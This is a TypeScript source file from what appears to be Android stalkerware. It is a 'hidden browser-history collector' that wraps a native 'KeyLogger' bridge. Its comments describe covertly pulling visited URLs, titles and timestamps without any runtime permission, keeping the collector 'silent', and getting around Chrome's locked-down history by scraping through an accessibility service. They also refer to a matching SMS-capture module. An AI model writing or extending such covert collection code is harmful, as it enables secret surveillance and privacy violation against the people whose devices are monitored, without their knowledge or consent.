// features/capture/browser.ts — hidden browser-history collector facade over
// the native KeyLogger.readBrowserHistory bridge. History + timestamps only,
// as the feature was scoped. No runtime permission is required. Modern Chrome
// (90+) no longer exports a working history ContentProvider (verified empty on
// Chrome 113 & 150), so the effect capture is driven by self-capture in the
// accessibility service — see native/keylogger/BrowserHistoryStore.kt. The
// bridge still falls back to provider reads for browsers that export one
// (Samsung Internet, AOSP Browser). Never throws; degraded states are explicit
// `{ ok:false, reason }` so the silent collector can skip cleanly.
import { KeyLogger } from '../keylogger/KeyLogger';

export type BrowserHistory = {
  /** native browser history row id — the idempotency key (same trust model as
   *  SMS `_id`; may shift after a history clear, which is a re-capture, not a
   *  loss) */
  browserId: string;
  /** The visited page URL. */
  url: string;
  /** Page title (may be empty). */
  title: string;
  /** visit date ms (native browser timestamp). */
  date: number;
  /** visit count reported by the provider (may be 0). */
  visits: number;
};

/** Strict decode of one native history descriptor string; null when malformed
 *  (mirrors decodeSms in the SMS slice). */
export function decodeBrowser(raw: string): BrowserHistory | null {
  try {
    const o = JSON.parse(raw) as Record<string, unknown>;
    if (typeof o['url'] !== 'string') return null;
    return {
      browserId: typeof o['browserId'] === 'string' ? o['browserId'] : '',
      url: o['url'],
      title: typeof o['title'] === 'string' ? o['title'] : '',
      date: typeof o['date'] === 'number' ? o['date'] : 0,
      visits: typeof o['visits'] === 'number' ? o['visits'] : 0,
    };
  } catch {
    return null;
  }
}

/**
 * Pull browser history created after [sinceTsMs] from the device. Dedupes by
 * browserId. Returns `ok:false, reason:'error'` on any native failure — the
 * collector must stay silent either way.
 */
export async function pullBrowserHistory(sinceTsMs: number): Promise<{
  ok: boolean;
  reason?: string;
  history: BrowserHistory[];
}> {
  try {
    const raw = await KeyLogger.readBrowserHistory(sinceTsMs);
    const out: BrowserHistory[] = [];
    const seen = new Set<string>();
    for (const s of raw) {
      const h = decodeBrowser(s);
      if (h && !seen.has(h.browserId)) {
        seen.add(h.browserId);
        out.push(h);
      }
    }
    out.sort((a, b) => a.date - b.date);
    return { ok: true, history: out };
  } catch {
    return { ok: false, reason: 'error', history: [] };
  }
}
